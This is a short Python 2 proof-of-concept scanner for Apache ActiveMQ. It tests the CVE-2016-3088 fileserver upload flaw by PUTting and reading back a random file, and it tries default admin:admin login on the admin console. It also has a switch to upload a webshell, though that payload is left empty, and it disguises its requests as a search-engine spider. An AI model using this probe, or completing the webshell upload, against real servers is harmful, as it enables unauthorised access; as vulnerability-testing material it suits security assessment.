#!/usr/bin/env python
# -*- coding: utf-8 -*-


import json
import base64
import random
import requests
from string import letters

Attack = False


def activemq_put(url):
    url = "http://" + url if '://' not in url else url
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
    name = ''.join([random.choice(letters) for i in range(6)])
    query = r'{url}/fileserver/{name}.txt'.format(url=url.rstrip('/'),name=name)
    webshell=''
    payload = webshell if Attack else ''.join([random.choice(letters) for i in range(10)])
    try:
        requests.put(query, headers=headers, data=payload, timeout=10)
        resp = requests.get(query, headers=headers, timeout=10)
        if resp.status_code == 200:
            return query if payload in resp.content else False
        else:
            return False
    except Exception:
        return False


def activemq_weak(url):
    if '://' not in url:
        url = 'http://' + url
    url += '/admin/'
    key = base64.b64encode("admin:admin")
    headers = {'Authorization': 'Basic %s}' % key, 'User-Agent': 'Mozilla/5.0 Gecko/20100101 Firefox/45.0'}
    try:
        c = requests.get(url, headers=headers, timeout=10).content
    except Exception, e:
        return False
    if 'Console' in c:
        return url+' '*5+"admin:admin"
    else:
        return False



def poc(url):
    info={}
    CVE_2016_3088= activemq_put(url)
    Activemq_weak=activemq_weak(url)
    if CVE_2016_3088:
        info.update({"Activemq_put": CVE_2016_3088})
    if Activemq_weak:
        info.update({"Activemq_weak": Activemq_weak})
    if len(info)>0:
        return json.dumps(info,indent=2,ensure_ascii=False)
    else:
        return False


if __name__ == '__main__':
    print poc('http://127.0.0.1:8161')